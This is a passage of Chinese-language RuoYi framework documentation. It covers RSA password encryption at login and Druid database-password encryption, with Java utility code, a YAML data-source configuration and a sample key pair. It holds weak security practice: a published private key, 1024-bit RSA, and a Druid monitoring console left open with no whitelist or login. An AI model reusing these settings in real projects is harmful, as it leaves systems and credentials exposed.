    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encryptByPrivateKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> privateKeyString<span class="token punctuation">,</span> <span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">PKCS8EncodedKeySpec</span> pkcs8EncodedKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PKCS8EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>privateKeyString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyFactory</span> keyFactory <span class="token operator">=</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateKey</span> privateKey <span class="token operator">=</span> keyFactory<span class="token punctuation">.</span><span class="token function">generatePrivate</span><span class="token punctuation">(</span>pkcs8EncodedKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span>ENCRYPT_MODE<span class="token punctuation">,</span> privateKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 私钥解密
     *
     * @param privateKeyString 私钥
     * @param text 待解密的文本
     * @return 解密后的文本
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decryptByPrivateKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> privateKeyString<span class="token punctuation">,</span> <span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">PKCS8EncodedKeySpec</span> pkcs8EncodedKeySpec5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PKCS8EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>privateKeyString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyFactory</span> keyFactory <span class="token operator">=</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateKey</span> privateKey <span class="token operator">=</span> keyFactory<span class="token punctuation">.</span><span class="token function">generatePrivate</span><span class="token punctuation">(</span>pkcs8EncodedKeySpec5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span>DECRYPT_MODE<span class="token punctuation">,</span> privateKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 公钥加密
     *
     * @param publicKeyString 公钥
     * @param text 待加密的文本
     * @return 加密后的文本
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encryptByPublicKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> publicKeyString<span class="token punctuation">,</span> <span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">X509EncodedKeySpec</span> x509EncodedKeySpec2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>publicKeyString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyFactory</span> keyFactory <span class="token operator">=</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PublicKey</span> publicKey <span class="token operator">=</span> keyFactory<span class="token punctuation">.</span><span class="token function">generatePublic</span><span class="token punctuation">(</span>x509EncodedKeySpec2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span>ENCRYPT_MODE<span class="token punctuation">,</span> publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 构建RSA密钥对
     *
     * @return 生成后的公私钥信息
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">RsaKeyPair</span> <span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">KeyPairGenerator</span> keyPairGenerator <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        keyPairGenerator<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyPair</span> keyPair <span class="token operator">=</span> keyPairGenerator<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RSAPublicKey</span> rsaPublicKey <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">)</span> keyPair<span class="token punctuation">.</span><span class="token function">getPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RSAPrivateKey</span> rsaPrivateKey <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RSAPrivateKey</span><span class="token punctuation">)</span> keyPair<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> publicKeyString <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>rsaPublicKey<span class="token punctuation">.</span><span class="token function">getEncoded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> privateKeyString <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>rsaPrivateKey<span class="token punctuation">.</span><span class="token function">getEncoded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RsaKeyPair</span><span class="token punctuation">(</span>publicKeyString<span class="token punctuation">,</span> privateKeyString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * RSA密钥对对象
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">RsaKeyPair</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> publicKey<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> privateKey<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">RsaKeyPair</span><span class="token punctuation">(</span><span class="token class-name">String</span> publicKey<span class="token punctuation">,</span> <span class="token class-name">String</span> privateKey<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>publicKey <span class="token operator">=</span> publicKey<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>privateKey <span class="token operator">=</span> privateKey<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> publicKey<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> privateKey<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、登录方法<code>SysLoginService.java</code>，对密码进行<code>rsa</code>解密。</p>
<pre><code class="prism language-text">// 关键代码 RsaUtils.decryptByPrivateKey(password)
authentication = authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(username, RsaUtils.decryptByPrivateKey(password)));
</code></pre>
<p>访问 <a href="http://localhost/login">http://localhost/login (opens new window)</a>登录页面。提交时检查密码是否为加密传输，且后台也能正常解密。</p>
<h2><a id="14druid_7673"></a>14、集成druid实现数据库密码加密功能</h2>
<p>数据库密码直接写在配置中，对运维安全来说，是一个很大的挑战。可以使用<code>Druid</code>为此提供一种数据库密码加密的手段<code>ConfigFilter</code>。项目已经集成<code>druid</code>所以只需按要求配置即可。</p>
<p>1、执行命令加密数据库密码</p>
<pre><code class="prism language-sh">java -cp druid-1.2.4.jar com.alibaba.druid.filter.config.ConfigTools password
</code></pre>
<p><code>password</code>输入你的数据库密码，输出的是加密后的结果。</p>
<pre><code class="prism language-text">privateKey:MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAuLMVAFmcew+mPfVnzI6utEvhHWO2s6e4R1bVW3a9IpH+pEypeNV6KtZ/w9PuysPfdPxW5fN3BmnKFZUAIMvWhQIDAQABAkA6rnsfr1juKFyzFsMx1KthETKmucWUctczoz0KYEFbN+joNsd/ApQqsS/2MVG1QWbDJLUsSLWkchvRbtiqOlVJAiEA6KmgVeLR2qUU9gv6DJfuWk4Ol1M9GJnTamgyDttsSGcCIQDLOdjcht29s954vApG1fiPTP/kMvZ5aLrccw1lEuEGMwIhAKoe3c3u++MTsi/2se9jaDU/vguIIbRLRfsYFQIoDxUhAiAnCm/cvZPvk5RTgVxAC276qIIoJpou7K2pF/kkx6Gu/QIgKUVFiM8GVZkOWZC+nUm3UIfpGjrKXjvGrlHNvt89uBA=
publicKey:MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALizFQBZnHsPpj31Z8yOrrRL4R1jtrOnuEdW1Vt2vSKR/qRMqXjVeirWf8PT7srD33T8VuXzdwZpyhWVACDL1oUCAwEAAQ==
password:gkYlljNHKe0/4z7bbJxD7v/txWJIFbiGWwsIPo176Q7fG0UjcSizNxuRUI2ll27ZPQf2ekiHFptus2/Rc4cmvA==
</code></pre>
<p>2、配置数据源，提示<code>Druid</code>数据源需要对数据库密码进行解密。</p>
<pre><code class="prism language-yml"><span class="token comment"># 数据源配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
    <span class="token key atrule">datasource</span><span class="token punctuation">:</span>
        <span class="token key atrule">type</span><span class="token punctuation">:</span> com.alibaba.druid.pool.DruidDataSource
        <span class="token key atrule">driverClassName</span><span class="token punctuation">:</span> com.mysql.cj.jdbc.Driver
        <span class="token key atrule">druid</span><span class="token punctuation">:</span>
            <span class="token comment"># 主库数据源</span>
            <span class="token key atrule">master</span><span class="token punctuation">:</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> gkYlljNHKe0/4z7bbJxD7v/txWJIFbiGWwsIPo176Q7fG0UjcSizNxuRUI2ll27ZPQf2ekiHFptus2/Rc4cmvA==
            <span class="token comment"># 从库数据源</span>
            <span class="token key atrule">slave</span><span class="token punctuation">:</span>
                <span class="token comment"># 从数据源开关/默认关闭</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> 
                <span class="token key atrule">username</span><span class="token punctuation">:</span> 
                <span class="token key atrule">password</span><span class="token punctuation">:</span> 
            <span class="token comment"># 初始连接数</span>
            <span class="token key atrule">initialSize</span><span class="token punctuation">:</span> <span class="token number">5</span>
            <span class="token comment"># 最小连接池数量</span>
            <span class="token key atrule">minIdle</span><span class="token punctuation">:</span> <span class="token number">10</span>
            <span class="token comment"># 最大连接池数量</span>
            <span class="token key atrule">maxActive</span><span class="token punctuation">:</span> <span class="token number">20</span>
            <span class="token comment"># 配置获取连接等待超时的时间</span>
            <span class="token key atrule">maxWait</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒</span>
            <span class="token key atrule">timeBetweenEvictionRunsMillis</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置一个连接在池中最小生存的时间，单位是毫秒</span>
            <span class="token key atrule">minEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">300000</span>
            <span class="token comment"># 配置一个连接在池中最大生存的时间，单位是毫秒</span>
            <span class="token key atrule">maxEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">900000</span>
            <span class="token comment"># 配置检测连接是否有效</span>
            <span class="token key atrule">validationQuery</span><span class="token punctuation">:</span> SELECT 1 FROM DUAL
            <span class="token key atrule">testWhileIdle</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">testOnBorrow</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">testOnReturn</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">connectProperties</span><span class="token punctuation">:</span> config.decrypt=true;config.decrypt.key=MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALizFQBZnHsPpj31Z8yOrrRL4R1jtrOnuEdW1Vt2vSKR/qRMqXjVeirWf8PT7srD33T8VuXzdwZpyhWVACDL1oUCAwEAAQ==
            <span class="token key atrule">webStatFilter</span><span class="token punctuation">:</span> 
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">statViewServlet</span><span class="token punctuation">:</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token comment"># 设置白名单，不填则允许所有访问</span>
                <span class="token key atrule">allow</span><span class="token punctuation">:</span>
                <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> /druid/*
                <span class="token comment"># 控制台管理用户名和密码</span>
                <span class="token key atrule">login-username</span><span class="token punctuation">:</span> 
                <span class="token key atrule">login-password</span><span class="token punctuation">:</span> 
            <span class="token key atrule">filter</span><span class="token punctuation">:</span>
                <span class="token key atrule">config</span><span class="token punctuation">:</span>
                    <span class="token comment"># 是否配置加密</span>
                    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">stat</span><span class="token punctuation">:</span>
                    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token comment"># 慢SQL记录</span>
                    <span class="token key atrule">log-slow-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token key atrule">slow-sql-millis</span><span class="token punctuation">:</span> <span class="token number">1000</span>
                    <span class="token key atrule">merge-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">wall</span><span class="token punctuation">:</span>
                    <span class="token key atrule">config</span><span class="token punctuation">:</span>
                        <span class="token key atrule">multi-statement-allow</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre>
<p>3、<code>DruidProperties</code>配置<code>connectProperties</code>属性</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>config<span class="token punctuation">.</span>properties</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSource</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * druid 配置属性
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DruidProperties</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.initialSize}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> initialSize<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.minIdle}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> minIdle<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.maxActive}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> maxActive<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.maxWait}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> maxWait<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.timeBetweenEvictionRunsMillis}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> timeBetweenEvictionRunsMillis<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.minEvictableIdleTimeMillis}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> minEvictableIdleTimeMillis<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.maxEvictableIdleTimeMillis}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> maxEvictableIdleTimeMillis<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.validationQuery}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> validationQuery<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.testWhileIdle}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> testWhileIdle<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.testOnBorrow}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> testOnBorrow<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.testOnReturn}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> testOnReturn<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.druid.connectProperties}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> connectProperties<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DruidDataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token class-name">DruidDataSource</span> datasource<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token comment">/** 配置初始化大小、最小、最大 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setInitialSize</span><span class="token punctuation">(</span>initialSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        datasource<span class="token punctuation">.</span><span class="token function">setMaxActive</span><span class="token punctuation">(</span>maxActive<span class="token punctuation">)</span><span class="token punctuation">;</span>
        datasource<span class="token punctuation">.</span><span class="token function">setMinIdle</span><span class="token punctuation">(</span>minIdle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/** 配置获取连接等待超时的时间 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setMaxWait</span><span class="token punctuation">(</span>maxWait<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/** 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setTimeBetweenEvictionRunsMillis</span><span class="token punctuation">(</span>timeBetweenEvictionRunsMillis<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/** 配置一个连接在池中最小、最大生存的时间，单位是毫秒 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setMinEvictableIdleTimeMillis</span><span class="token punctuation">(</span>minEvictableIdleTimeMillis<span class="token punctuation">)</span><span class="token punctuation">;</span>
        datasource<span class="token punctuation">.</span><span class="token function">setMaxEvictableIdleTimeMillis</span><span class="token punctuation">(</span>maxEvictableIdleTimeMillis<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/**
         * 用来检测连接是否有效的sql，要求是一个查询语句，常用select 'x'。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会起作用。
         */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setValidationQuery</span><span class="token punctuation">(</span>validationQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/** 建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setTestWhileIdle</span><span class="token punctuation">(</span>testWhileIdle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/** 申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setTestOnBorrow</span><span class="token punctuation">(</span>testOnBorrow<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/** 归还连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setTestOnReturn</span><span class="token punctuation">(</span>testOnReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/** 为数据库密码提供加密功能 */</span>
        datasource<span class="token punctuation">.</span><span class="token function">setConnectionProperties</span><span class="token punctuation">(</span>connectProperties<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> datasource<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、启动应用程序测试验证加密结果</p>
<p>提示</p>
<p>如若忘记密码可以使用工具类解密（传入生成的公钥+密码）</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token class-name">ConfigTools</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>
			<span class="token string">"MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALizFQBZnHsPpj31Z8yOrrRL4R1jtrOnuEdW1Vt2vSKR/qRMqXjVeirWf8PT7srD33T8VuXzdwZpyhWVACDL1oUCAwEAAQ=="</span><span class="token punctuation">,</span>
			<span class="token string">"gkYlljNHKe0/4z7bbJxD7v/txWJIFbiGWwsIPo176Q7fG0UjcSizNxuRUI2ll27ZPQf2ekiHFptus2/Rc4cmvA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"解密密码："</span> <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h1><a id="_7871"></a>二十四、<strong>项目扩展</strong></h1>
<h2><a id="1_7873"></a>1、<strong>后台扩展</strong></h2>
<p><code>项目扩展</code>用于收集来自基于<a href="https://gitee.com/y_project/RuoYi">RuoYi (opens new window)</a>的插件集成或完整项目，由开发者自己维护。如果你有自己或喜欢的项目想出现在列表中，可以发送仓库地址到我的邮箱<code>346039442@qq.com</code>…</p>
